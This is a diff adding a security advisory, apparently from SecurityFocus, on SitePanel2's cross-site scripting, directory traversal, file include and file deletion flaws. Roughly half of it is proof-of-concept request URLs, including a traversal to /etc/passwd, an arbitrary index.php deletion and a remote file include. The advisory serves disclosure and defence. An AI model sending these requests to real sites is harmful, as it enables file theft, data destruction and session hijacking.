@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/13481/info
+
+SitePanel2 is affected by multiple input validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+Multiple cross-site scripting issues affect the application. An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+SitePanel2 is prone to a directory traversal vulnerability. This vulnerability could be exploited to retrieve sensitive or privileged information normally accessible to the Web server.
+
+The application is also vulnerable to file include, upload and deletion vulnerabilities. These issues could permit the execution of arbitrary code in the context of the affected Web site or the deletion of arbitrary files accessible to the application. 
+
+http://www.example.com/users/main.php?p=5&do=2&v=177%22%3E[XSS]
+http://www.example.com/admin/5.php?do=chsev&postid=177&usernamess=test&inadmin=no%22%3E[XSS]
+http://www.example.com/admin/5.php?do=chsev2&postid=177&usernamess=test&inadmin=no&newsev=4%22%3E[XSS]
+http://www.example.com/admin/5.php?do=chsev&postid=177%22%3E[XSS]&usernamess=test&inadmin=no
+http://www.example.com/users/main.php?p=5&do=0&show=closed%22%3E[XSS]
+http://www.example.com/admin/0.php?do=ratekb&id=11%22%3E[XSS]
+http://www.example.com/users/main.php?p=6&do=0&v=post&id=11&sec_name=Blah%22%3E[XSS]
+
+Arbitrary file deletion proof of concept:
+http://www.example.com/admin/5.php?do=rmattach&rm=yes&id=../index.php
+
+Directory traversal proof of concept:
+http://www.example.com/users/index.php?lang=en.inc/../../../../../../etc/passwd%00
+
+File include proof of concept:
+http://www.example.com/users/main.php?p=http://www.example.com 
